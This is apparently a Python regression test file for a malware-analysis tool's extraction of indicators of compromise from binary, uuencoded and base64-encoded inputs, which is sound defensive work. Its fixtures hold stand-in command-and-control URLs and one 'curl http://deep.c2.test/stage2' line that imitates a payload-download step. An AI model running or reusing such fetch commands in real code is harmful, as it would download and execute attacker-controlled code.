"""Regression test: IOCs must be extracted from all node previews, not just
Text-classified ones.

run_analysis previously joined only ``content_type == "Text"`` node previews for
IOC extraction. Malware routinely embeds C2 URLs/IPs in otherwise-binary content
(config blobs, shellcode, a readable URL followed by binary padding), which
tips ``looks_like_text`` to "Binary" and silently dropped the indicators.
"""

import io
import os
import binascii

from titan_decoder.core.engine import TitanEngine
from titan_decoder.config import Config


def _engine():
    cfg = Config()
    cfg.set("max_recursion_depth", 8)
    return TitanEngine(cfg)


def test_url_in_binary_blob_is_extracted():
    # A URL embedded between random binary padding -> node classifies Binary.
    blob = os.urandom(64) + b" c2=http://c2.binary.test/gate " + os.urandom(64)
    rep = _engine().run_analysis(blob)
    assert "http://c2.binary.test/gate" in rep["iocs"].get("urls", [])


def test_public_ip_in_binary_blob_is_extracted():
    # 8.8.8.8 is a genuinely global/routable address (documentation ranges like
    # 203.0.113.0/24 are correctly classified non-global by ipaddress.is_global).
    blob = os.urandom(48) + b" callback 8.8.8.8 now " + os.urandom(48)
    rep = _engine().run_analysis(blob)
    assert "8.8.8.8" in rep["iocs"].get("ipv4_public", [])


def test_uuencoded_payload_with_binary_tail_recovers_url():
    def uuenc(b):
        out = io.BytesIO()
        out.write(b"begin 644 f\n")
        i = 0
        while i < len(b):
            out.write(binascii.b2a_uu(b[i : i + 45]))
            i += 45
        out.write(b"`\nend\n")
        return out.getvalue()

    payload = b"secret http://uu.evil.test/beacon " + bytes(range(200, 220))
    rep = _engine().run_analysis(uuenc(payload))
    assert "http://uu.evil.test/beacon" in rep["iocs"].get("urls", [])


def test_random_binary_does_not_fabricate_network_iocs():
    eng = _engine()
    fabricated = 0
    for _ in range(200):
        rep = eng.run_analysis(os.urandom(512))
        iocs = rep.get("iocs", {})
        fabricated += len(iocs.get("urls", [])) + len(iocs.get("ipv4_public", []))
    assert fabricated == 0


def test_indicator_past_the_preview_window_is_extracted():
    # ``content_preview`` is a 2KB reporting excerpt. IOC extraction ran over
    # that excerpt, so an indicator later in the artifact was invisible even
    # though the bytes were retained -- a 10KB script with its C2 on the last
    # line reported zero URLs.
    padding = b"Write-Output 'padding'\n" * 500
    assert len(padding) > 2000
    blob = padding + b"$u = 'http://late.c2.test/beacon'\n"
    rep = _engine().run_analysis(blob)
    assert "http://late.c2.test/beacon" in rep["iocs"].get("urls", [])


def test_indicator_past_the_preview_window_is_extracted_from_decoded_child():
    # The same boundary applies to derived nodes, not just the root.
    import base64

    padding = b"# filler line\n" * 400
    inner = padding + b"curl http://deep.c2.test/stage2\n"
    assert len(inner) > 2000
    rep = _engine().run_analysis(base64.b64encode(inner))
    assert "http://deep.c2.test/stage2" in rep["iocs"].get("urls", [])


def test_ioc_scan_window_is_bounded_by_config():
    # The wider window is a bound, not "scan everything": a configured cap must
    # actually stop the scan, so oversized artifacts cannot drive unbounded
    # regex work.
    cfg = Config()
    cfg.set("max_recursion_depth", 8)
    cfg.set("max_ioc_scan_bytes", 512)
    blob = b"A" * 4096 + b" http://beyond.bound.test/x "
    rep = TitanEngine(cfg).run_analysis(blob)
    assert "http://beyond.bound.test/x" not in rep["iocs"].get("urls", [])


def test_wider_scan_window_does_not_fabricate_iocs_in_large_binaries():
    # The FP guard has to hold at the new window size, not just at 2KB.
    eng = _engine()
    fabricated = 0
    for _ in range(25):
        rep = eng.run_analysis(os.urandom(64 * 1024))
        iocs = rep.get("iocs", {})
        fabricated += len(iocs.get("urls", [])) + len(iocs.get("ipv4_public", []))
    assert fabricated == 0
